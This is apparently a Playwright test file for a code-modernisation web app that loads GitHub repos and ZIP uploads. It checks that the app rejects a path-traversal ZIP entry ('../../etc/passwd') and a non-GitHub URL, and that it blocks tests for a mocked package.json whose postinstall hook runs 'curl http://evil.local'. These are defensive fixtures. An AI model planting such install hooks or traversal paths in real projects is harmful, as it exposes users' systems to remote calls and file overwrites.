import { test, expect } from "@playwright/test";
import zlib from "node:zlib";

function crc32(buf: Buffer): number {
  let crc = 0xffffffff;
  for (let i = 0; i < buf.length; i++) {
    crc ^= buf[i];
    for (let j = 0; j < 8; j++) {
      crc = (crc >>> 1) ^ (crc & 1 ? 0xedb88320 : 0);
    }
  }
  return (crc ^ 0xffffffff) >>> 0;
}

function buildZipBuffer(entries: Array<{ name: string; content: string }>): Buffer {
  const localParts: Buffer[] = [];
  const centralParts: Buffer[] = [];
  let offset = 0;

  for (const entry of entries) {
    const nameBuf = Buffer.from(entry.name, "utf8");
    const rawBuf = Buffer.from(entry.content, "utf8");
    const compressed = zlib.deflateRawSync(rawBuf);
    const crc = crc32(rawBuf);

    const local = Buffer.alloc(30 + nameBuf.length);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6);
    local.writeUInt16LE(8, 8);
    local.writeUInt16LE(0, 10);
    local.writeUInt16LE(0, 12);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(compressed.length, 18);
    local.writeUInt32LE(rawBuf.length, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    local.writeUInt16LE(0, 28);
    nameBuf.copy(local, 30);

    localParts.push(local, compressed);

    const central = Buffer.alloc(46 + nameBuf.length);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0, 8);
    central.writeUInt16LE(8, 10);
    central.writeUInt16LE(0, 12);
    central.writeUInt16LE(0, 14);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(compressed.length, 20);
    central.writeUInt32LE(rawBuf.length, 24);
    central.writeUInt16LE(nameBuf.length, 28);
    central.writeUInt16LE(0, 30);
    central.writeUInt16LE(0, 32);
    central.writeUInt16LE(0, 34);
    central.writeUInt16LE(0, 36);
    central.writeUInt32LE(0, 38);
    central.writeUInt32LE(offset, 42);
    nameBuf.copy(central, 46);

    centralParts.push(central);
    offset += local.length + compressed.length;
  }

  const centralDir = Buffer.concat(centralParts);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(0, 4);
  end.writeUInt16LE(0, 6);
  end.writeUInt16LE(entries.length, 8);
  end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(centralDir.length, 12);
  end.writeUInt32LE(offset, 16);
  end.writeUInt16LE(0, 20);

  return Buffer.concat([...localParts, centralDir, end]);
}

test.describe("04. GitHub URL & ZIP Archive Ingestion Edge Cases", () => {
  test("Valid .zip upload loads files, switches files, fixes code, and runs Docker tests", async ({
    page,
  }) => {
    const zipBuffer = buildZipBuffer([
      {
        name: "calc.py",
        content: "def square(x):\n    print 'squaring'\n    return x * x\n",
      },
      {
        name: "test_calc.py",
        content:
          "import unittest\nfrom calc import square\nclass T(unittest.TestCase):\n    def test_sq(self):\n        self.assertEqual(square(4), 16)\n",
      },
    ]);

    await page.goto("/lab?mode=github");
    const fileInput = page.locator('input[type="file"]');
    await fileInput.setInputFiles({
      name: "legacy-calc.zip",
      mimeType: "application/zip",
      buffer: zipBuffer,
    });

    await expect(page.getByText(/legacy-calc/i).first()).toBeVisible({ timeout: 8000 });
    await expect(
      page.getByRole("button", { name: "calc.py", exact: true })
    ).toBeVisible();

    await page.getByRole("button", { name: /^Fix Code$/i }).click();
    await expect(page.getByText(/Syntax OK • Tests Not Run/i).first()).toBeVisible({
      timeout: 10_000,
    });

    await page.getByRole("button", { name: /Approve Fix/i }).click();
    await page.getByRole("button", { name: /Run Tests/i }).click();

    await expect(
      page.getByText(/All Tests Passed|Tests Blocked/i).first()
    ).toBeVisible({ timeout: 20_000 });
  });

  test("Rejects path-traversal ZIP and invalid non-GitHub URLs cleanly", async ({
    page,
  }) => {
    await page.goto("/lab?mode=github");

    const sourceRegion = page.getByRole("region", { name: "Choose code source" });

    // 1. Non-GitHub URL
    const urlInput = page.getByLabel("Public GitHub repository URL");
    await urlInput.fill("https://evil.example.com/owner/repo");
    await page.getByRole("button", { name: /Load Repo/i }).click();
    await expect(sourceRegion.getByRole("alert")).toBeVisible({ timeout: 5000 });

    // 2. Malicious ZIP with ../ traversal
    const badZip = buildZipBuffer([{ name: "../../etc/passwd", content: "root:x:0:0" }]);
    await page.locator('input[type="file"]').setInputFiles({
      name: "traversal.zip",
      mimeType: "application/zip",
      buffer: badZip,
    });
    await expect(sourceRegion.getByRole("alert")).toBeVisible({ timeout: 5000 });
  });

  test("Mocked GitHub repo ingestion handles multi-file repo and 404 error cleanly", async ({
    page,
  }) => {
    await page.route("**/api/repo/ingest", async (route) => {
      const postData = route.request().postDataJSON() as { repoUrl?: string };
      if (postData?.repoUrl?.includes("missing-repo")) {
        await route.fulfill({
          status: 404,
          contentType: "application/json",
          body: JSON.stringify({ error: "GitHub repository not found or private." }),
        });
        return;
      }
      await route.fulfill({
        status: 200,
        contentType: "application/json",
        body: JSON.stringify({
          repository: {
            id: "gh_demo_1",
            source: "github",
            repoUrl: "https://github.com/octocat/legacy-node",
            owner: "octocat",
            name: "legacy-node",
            isPythonProject: false,
            detectedFrameworks: ["Node.js"],
            dependencyManifests: ["package.json"],
            testFiles: ["index.test.mjs"],
            totalBytes: 240,
            truncated: false,
            skippedCount: 0,
            warnings: [],
            files: [
              {
                path: "package.json",
                content: JSON.stringify({
                  name: "legacy-node",
                  scripts: { postinstall: "curl http://evil.local" },
                }),
                sizeBytes: 90,
                language: "manifest",
                isTestFile: false,
                isDependencyManifest: true,
              },
              {
                path: "index.mjs",
                content: "export const ok = () => true;\n",
                sizeBytes: 30,
                language: "javascript",
                isTestFile: false,
                isDependencyManifest: false,
              },
            ],
          },
        }),
      });
    });

    await page.goto("/lab?mode=github");
    const urlInput = page.getByLabel("Public GitHub repository URL");

    const sourceRegion = page.getByRole("region", { name: "Choose code source" });

    // 404 case
    await urlInput.fill("https://github.com/octocat/missing-repo");
    await page.getByRole("button", { name: /Load Repo/i }).click();
    await expect(sourceRegion.getByRole("alert")).toContainText(/not found/i);

    // Valid mocked repo with malicious postinstall script -> Tests Blocked on Run Tests
    await urlInput.fill("https://github.com/octocat/legacy-node");
    await page.getByRole("button", { name: /Load Repo/i }).click();
    await expect(page.getByText("octocat/legacy-node")).toBeVisible();

    await page.getByRole("button", { name: /^Fix Code$/i }).click();
    await expect(page.getByRole("button", { name: /Approve Fix/i })).toBeVisible({
      timeout: 8000,
    });
    await page.getByRole("button", { name: /Approve Fix/i }).click();
    await page.getByRole("button", { name: /Run Tests/i }).click();

    await expect(page.getByText(/Tests Blocked/i).first()).toBeVisible({
      timeout: 10_000,
    });
  });
});
